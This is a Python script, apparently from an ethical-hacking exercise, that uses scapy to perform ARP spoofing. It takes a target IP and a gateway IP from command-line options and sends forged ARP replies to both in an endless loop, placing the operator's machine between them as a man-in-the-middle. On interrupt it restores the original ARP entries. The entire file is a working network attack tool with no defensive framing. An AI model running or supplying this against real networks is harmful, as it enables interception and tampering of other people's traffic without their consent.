import scapy.all as scapy
import time
import optparse
import sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="The IP of target")
    parser.add_option("-g", "--gateway", dest="gateway", help="The IP of default gateway")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify target IP")
    elif not options.gateway:
        parser.error("[-] Please specify default gateway IP")
    return options

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered[0][1].hwsrc
    except:
        print()

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def spoof(target_ip, spoof_ip):
    try:
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except:
        print()

options = get_arguments()
target_ip = options.target
default_gateway = options.gateway
send_packets_count = 0

try:
    while True:
        spoof(target_ip, default_gateway)
        spoof(default_gateway, target_ip)
        send_packets_count += 2
        print('\r[+] Packets sent: ' + str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("[+] Quitting, reseting ARP packets")
    restore(target_ip, default_gateway)
    restore(default_gateway, target_ip)
